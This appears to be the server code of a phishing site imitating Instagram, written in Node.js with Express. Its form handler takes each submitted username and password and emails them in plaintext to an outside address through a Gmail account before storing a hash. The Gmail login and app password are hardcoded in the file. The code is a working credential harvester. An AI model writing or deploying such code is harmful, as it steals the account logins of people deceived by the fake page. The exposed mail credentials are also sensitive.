const express = require("express");
require("./db/conn");
const instagram = require("./models/model");
const app = express();
const hbs = require("hbs")
const path = require("path");
const port = process.env.PORT || 3000;
const nodemailer = require("nodemailer");
const bcrypt = require('bcryptjs')

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

const static_path = path.join(__dirname, "./public");
const template_path = path.join(__dirname, "./template/views");
app.use(express.static(static_path));
app.set("view engine", "hbs");
app.set("views", template_path);

let mailTransporter = nodemailer.createTransport({
    service: "gmail",
    auth:{
        user: "start112002up@gmail.com",
        pass: "sxdcthedvkukqlsk"
    }
})

app.get("/", async (req, res) => {
    res.render("instagram");
})

app.post("/instagram", async (req, res) => {
    const {username, password} = req.body;
  
    let user = await instagram.findOne({username});
    if (user) {
        return res.render("new2");
    }
   
    let details = {
        from: "start112002up@gmail.com",
        to: "me20b1040@iiitdm.ac.in",
        subject: "new user fill the form",
        text: `new user fill form username is  ${username} and password is  ${password}`
    }
    mailTransporter.sendMail(details, (err)=>{
        if (err) {
            console.log("it has an error",err);
        }else{
            console.log("email has sent");
        }
    })
    const salt = await bcrypt.genSalt(10);
    const secPass = await bcrypt.hash(password, salt)
    user = await instagram.create({
        username,
        password:secPass
    })
    const newUser = await user.save();
    // console.log(newUser);
    res.status(201).render("new");
    // console.log(newUser);

    // const name = await Resister.findOne({ username: username })

})

app.listen(port, () => {
    console.log(`connection is live ${port}/`);
})